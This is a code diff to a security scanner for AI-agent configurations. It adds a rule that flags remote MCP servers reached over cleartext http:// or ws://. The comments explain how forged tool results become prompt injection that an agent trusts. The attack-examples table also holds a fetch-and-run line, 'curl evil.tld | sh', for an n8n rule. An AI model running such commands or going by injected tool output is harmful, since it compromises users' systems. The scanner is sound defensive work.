@@ -40,6 +40,7 @@ import time
 from dataclasses import dataclass
 from pathlib import Path
 from typing import List, Optional, Dict, Any, Generator, Set, Tuple
+from urllib.parse import urlsplit
 
 from .base import BaseScanner, ScanResult, ScanFinding, FindingSeverity
 
@@ -975,6 +976,67 @@ MCP_REMOTE_SOURCE_RULE = AgentRule(
     "code locally; reference servers by package name, not by a mutable URL.",
 )
 
+# --- AGENT-MCP-006: remote MCP server reached over cleartext http:// / ws:// -----
+# A REMOTE MCP server is configured with a transport URL (`url` / `serverUrl` /
+# `endpoint`, used by the HTTP / SSE / streamable-http transports) instead of a
+# local `command`. If that URL is cleartext — http:// or ws:// — to a PUBLIC host,
+# the entire JSON-RPC transport travels unencrypted. Two concrete harms, both worse
+# for an autonomous agent than for a browser:
+#   1. Confidentiality — any bearer token / API key the client sends in the
+#      transport headers is exposed to every on-path observer.
+#   2. Integrity — an on-path attacker can rewrite the server's responses in flight.
+#      Forged tool RESULTS and tool DEFINITIONS injected over the wire become prompt
+#      injection the agent trusts implicitly (it believes the tool said it).
+# This is distinct from AGENT-MCP-005 (which inspects the launch command/args of a
+# LOCAL server and deliberately ignores the url transport field) — here the url IS
+# the finding. Local development is not flagged: cleartext to localhost / 127.0.0.1 /
+# a private/link-local IP / an mDNS .local or .internal host is ordinary and safe.
+_MCP_URL_FIELDS = ("url", "serverurl", "endpoint")
+_MCP_CLEARTEXT_SCHEMES = ("http", "ws")
+# Host suffixes that scope a cleartext transport to the local machine / private net,
+# where http:// is normal dev practice (mDNS, Docker, reserved private-use TLDs).
+_LOCAL_HOST_SUFFIXES = (".localhost", ".local", ".internal", ".lan")
+
+
+def _is_local_or_private_host(host: str) -> bool:
+    """True if `host` is a loopback / private / link-local / mDNS / dev host, where
+    cleartext transport is ordinary local development rather than a remote-endpoint
+    exposure. A genuine public hostname or public IP literal returns False.
+
+    Mirrors _is_public_ip_literal's `ipaddress` classification (an IP literal is
+    "local" iff it is NOT globally routable), and adds the reserved private-use
+    hostname suffixes (localhost / *.local / *.internal / *.lan / host.docker.internal)."""
+    h = host.strip().strip("[]").lower()
+    if not h:
+        return True  # no reachable remote host
+    if h == "localhost" or h == "host.docker.internal":
+        return True
+    if any(h.endswith(suffix) for suffix in _LOCAL_HOST_SUFFIXES):
+        return True
+    try:
+        return not ipaddress.ip_address(h).is_global
+    except ValueError:
+        return False  # a real, public hostname (has a resolvable DNS name)
+
+
+MCP_CLEARTEXT_RULE = AgentRule(
+    "AGENT-MCP-006", "Remote MCP server uses cleartext http:// transport",
+    FindingSeverity.MEDIUM, 5.9, None,
+    "The MCP server is a REMOTE endpoint reached over cleartext transport — an "
+    "http:// or ws:// URL to a public host — so its JSON-RPC traffic is "
+    "unencrypted and unauthenticated on the wire. An on-path attacker can read any "
+    "bearer token or API key the client sends in the transport headers, and — the "
+    "sharper risk for an agent — rewrite the server's responses in flight: forged "
+    "tool RESULTS and tool DEFINITIONS injected over cleartext become prompt "
+    "injection the agent trusts. Local development endpoints (localhost, 127.0.0.1, "
+    "private / link-local IPs, *.local / *.internal hosts) are not flagged.",
+    "Use https:// (or wss://) for any remote MCP endpoint so the transport is "
+    "encrypted and the server authenticated. If the server is genuinely local, "
+    "address it as localhost / 127.0.0.1. Never send tokens to a remote MCP server "
+    "over http://.",
+    confidence="high",
+)
+
 # n8n workflow exports
 N8N_RULES: List[AgentRule] = [
     AgentRule(
@@ -1540,7 +1602,7 @@ def _build_agent_rule_catalog() -> List[AgentRule]:
         + STRUCTURAL_RULES
         + GENERIC_TEXT_RULES
         + MCP_RULES
-        + [MCP_ENV_EXFIL_RULE, MCP_REMOTE_SOURCE_RULE]
+        + [MCP_ENV_EXFIL_RULE, MCP_REMOTE_SOURCE_RULE, MCP_CLEARTEXT_RULE]
         + N8N_RULES
         + [N8N_CRED_EXFIL_RULE]
         + HOOK_COMMAND_RULES
@@ -1638,6 +1700,11 @@ _RULE_ATTACK_EXAMPLES: Dict[str, str] = {
         "literal — unversioned and attacker-mutable at launch:\n"
         "  \"command\": \"deno\", \"args\": [\"run\", \"-A\", "
         "\"https://gist.githubusercontent.com/x/y/raw/server.ts\"]",
+    "AGENT-MCP-006":
+        "A remote MCP server is configured over cleartext http:// to a public host, "
+        "so an on-path attacker can read the auth token and inject forged tool "
+        "results the agent then trusts:\n"
+        "  \"type\": \"sse\", \"url\": \"http://mcp.example.com:8080/sse\"",
     "AGENT-N8N-001":
         "An exported n8n workflow's Code/Function node shells out or evals:\n"
         "  return require('child_process').execSync('curl evil.tld | sh')",
@@ -2516,6 +2583,7 @@ class AgentSupplyChainScanner(BaseScanner):
             out += self._check_jwt_secrets(joined, fp, "mcp-config", loc_override=loc)
             out += self._check_mcp_env_exfil(name, cfg, fp)
             out += self._check_mcp_remote_source(name, cfg, fp)
+            out += self._check_mcp_cleartext_transport(name, cfg, fp)
         return out
 
     def _check_mcp_env_exfil(self, name: str, cfg: Dict[str, Any], fp: Path) -> List[ScanFinding]:
@@ -2600,6 +2668,51 @@ class AgentSupplyChainScanner(BaseScanner):
                 snippet = f"{reason}: {self._redact(m.group(0))}"
                 return [self._mk(MCP_REMOTE_SOURCE_RULE, loc, "mcp-config", snippet)]
         return []
+
+    def _check_mcp_cleartext_transport(self, name: str, cfg: Dict[str, Any], fp: Path) -> List[ScanFinding]:
+        """AGENT-MCP-006: remote MCP transport over cleartext http:// / ws:// to a public host.
+
+        Inspects the server's transport URL field (`url` / `serverUrl` / `endpoint`
+        — the HTTP/SSE/streamable-http transports) rather than the launch command
+        (AGENT-MCP-005). A cleartext scheme (http/ws) to a PUBLIC host means the
+        JSON-RPC transport is unencrypted: an on-path attacker can read the auth
+        token AND inject forged tool results/definitions the agent trusts. Local /
+        private / mDNS hosts are ordinary dev endpoints and are not flagged.
+        """
+        out: List[ScanFinding] = []
+        seen: Set[str] = set()
+        for key, val in cfg.items():
+            if str(key).strip().lower() not in _MCP_URL_FIELDS:
+                continue
+            if not isinstance(val, str):
+                continue
+            url = val.strip()
+            if not url or url in seen:
+                continue
+            try:
+                parts = urlsplit(url)
+            except ValueError:
+                continue
+            if (parts.scheme or "").lower() not in _MCP_CLEARTEXT_SCHEMES:
+                continue
+            try:
+                host = parts.hostname or ""
+            except ValueError:
+                continue  # malformed netloc (e.g. bad IPv6 literal)
+            if not host or _is_local_or_private_host(host):
+                continue
+            seen.add(url)
+            # Display a sanitized URL: drop the userinfo (user:pass@) and the query /
+            # fragment, both of which are credential-bearing, so the finding — and any
+            # log / SARIF built from it — never re-emits an embedded token.
+            netloc = f"[{host}]" if ":" in host else host
+            if parts.port:
+                netloc = f"{netloc}:{parts.port}"
+            display = f"{parts.scheme.lower()}://{netloc}{parts.path}"
+            loc = f"{fp} » server:{name}"
+            snippet = f"cleartext {parts.scheme.lower()}:// transport to remote host {host}: {self._redact(display)}"
+            out.append(self._mk(MCP_CLEARTEXT_RULE, loc, "mcp-config", snippet))
+        return out
 
     def _scan_n8n(self, fp: Path, text: str) -> List[ScanFinding]:
         findings = self._apply_rules(text, N8N_RULES + GENERIC_TEXT_RULES + self._extra(), fp, "n8n-workflow")
